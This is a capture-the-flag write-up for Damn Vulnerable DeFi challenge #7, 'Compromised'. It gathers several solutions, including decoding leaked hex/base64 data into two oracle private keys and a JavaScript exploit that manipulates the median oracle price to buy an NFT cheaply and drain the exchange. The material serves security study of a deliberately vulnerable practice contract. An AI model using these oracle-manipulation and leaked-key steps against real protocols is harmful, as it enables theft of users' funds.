## [Challenge #7 - Compromised](https://www.damnvulnerabledefi.xyz/challenges/7.html)

While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34     
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

This price is fetched from an on-chain oracle, and is based on three trusted reporters: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.

Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

## Solutions

### Self

For this one, the idea was pretty simple once I figured out that the HTTP information was the base64 encoded value of the private keys for two of the oracles. After that it was pretty simple to figure out that I needed to reduce the price of the NFT in the two oracles[^1]. One the price was reduced I could by one NFT for the 0.1 ETH in my wallet. Then set the price back to the balance of ETH in the exchange. Then when the NFT is sold back the exchange transfers its entire balance to the seller.

The biggest problem I ran into was that when I would try to buy the NFT I was given the following error:

```

InvalidInputError: sender doesn't have enough funds to send tx. The max upfront cost is: 100206169921309290 and the sender's account only has: 100000000000000000
    at TxPool._validateTransaction (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/TxPool.ts:447:13)
    at processTicksAndRejections (internal/process/task_queues.js:95:5)
    at TxPool.addTransaction (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/TxPool.ts:112:5)
    at HardhatNode._addPendingTransaction (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1402:5)
    at HardhatNode._mineTransaction (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1410:5)
    at EthModule._sendTransactionAndReturnHash (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1494:18)
    at HardhatNetworkProvider.request (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:108:18)
    at EthersProviderWrapper.send (/Users/mike/workspace/CTF/damn-vulnerable-defi/node_modules/@nomiclabs/hardhat-ethers/src/internal/ethers-provider-wrapper.ts:13:20)
    
```

And no matter what I did, this was causing me to be stopped in my tracks. I am not sure if it was part of the challenge, but it certainly caused me some headaches. And then finally, after spending a substantial amount of time (a few hours over the span of 3 or 4 days), I finally realized that I need to spend 0.09 ETH instead of the 0.1 ETH that was being shown in [cmichel.io](https://cmichel.io/damn-vulnerable-de-fi-solutions/)'s solution as well as [Zuhaib Mohammed](https://zuhaibmd.medium.com/damn-vulnerable-defi-challenge-7-compromised-feb249be0e2f)'s solution.

### [cmichel.io](https://cmichel.io/damn-vulnerable-de-fi-solutions/)

The seventh challenge deals with an NFT exchange contract that automatically buys and sells certain NFTs at a price determined by an oracle. The oracle itself uses three externally owned accounts as price feeders and returns the median of the reported prices. Our goal is to manipulate the price to buy a cheap NFT, then manipulate the price again to sell this NFT for a huge profit. As the oracle uses the median we need to manipulate at least two oracles to be able to change the price.

The [challenge description](https://www.damnvulnerabledefi.xyz/challenges/7.html) shows an excerpt of a HTTP response with some hex data:

```http request
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

After decoding this hex data, we get a base64 string. Which we can decode again to receive the following:

```
1. Leaked data: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
2. Decoded from hex: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
3. Private key from base64: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

4. Leaked data: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
5. Decoded from hex: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
6. Private key from base64: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

The result for each decoding is a 32-byte string. Ethereum uses elliptic curve cryptography, more specifically the secp256k1 curve, which has 32-byte scalars. These scalars are used as private keys of accounts. The public key is this private key multiplied by the generator point and has ~33 bytes as you only need to encode the x coordinate and a flag which one of the two y-coordinates it is. The address, in turn, is the 20 lower bytes of the keccak256 hash of this public key.

Which means we can interpret these two hex strings as private keys and check what addresses they correspond to. I used the following JS code for that:

```javascript
const leakToPrivateKey = leak => {
  console.log(`1. Leaked data: ${leak}`)
  const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
  console.log(`2. Decoded from hex: ${base64}`)
  const hexKey = Buffer.from(base64, `base64`).toString(`utf8`)
  console.log(`3. Private key from base64: ${hexKey}`)
  return hexKey
}

// codes from https://www.damnvulnerabledefi.xyz/challenges/7.html
const compromisedOracles = [
  leakToPrivateKey(
    `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`
  ),
  leakToPrivateKey(
    `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`
  ),
].map(privateKeyHex => {
  // important to keep the `0x` prefix
  return web3.eth.accounts.privateKeyToAccount(privateKeyHex)
})

console.log(
  `Compromised oracles addresses: ${compromisedOracles
    .map(acc => acc.address)
    .join(` `)}`
)
// Compromised oracles addresses: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15 0x81A5D6E50C214044bE44cA0CB057fe119097850c

```

Indeed, we found the private keys for the last two oracle sources which allow [modifying the price and buying / selling NFTs for profit](https://github.com/MrToph/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L69-L147).

```javascript
// 1. reduce NFT price to buy it cheap
const reducedPrice = ether(`0.1`)
await changePrice(reducedPrice.toString());

// 2. buy 1 NFT at this price
await this.exchange.buyOne({ from: attacker, value: reducedPrice });

// 3. increase NFT price to drain all Funds
const exchangeBalance = await balance.current(this.exchange.address);
await changePrice(exchangeBalance.toString());

// 4. approve transferFrom of 1 DVNFT token and sell it
await this.token.approve(this.exchange.address, 1, { from: attacker });
const FIRST_TOKEN_ID = 1;
await this.exchange.sellOne(FIRST_TOKEN_ID, { from: attacker });
```

### [Zuhaib Mohammed](https://zuhaibmd.medium.com/damn-vulnerable-defi-challenge-7-compromised-feb249be0e2f)

This one has the solution as an embedded image, which is sort of a pain. But it was helpful and I liked the solution better as it was more concise and done with `ethersjs`.




[^1] needed 2 of 3 oracles with the same price as the median price is used when buying and selling the NFT.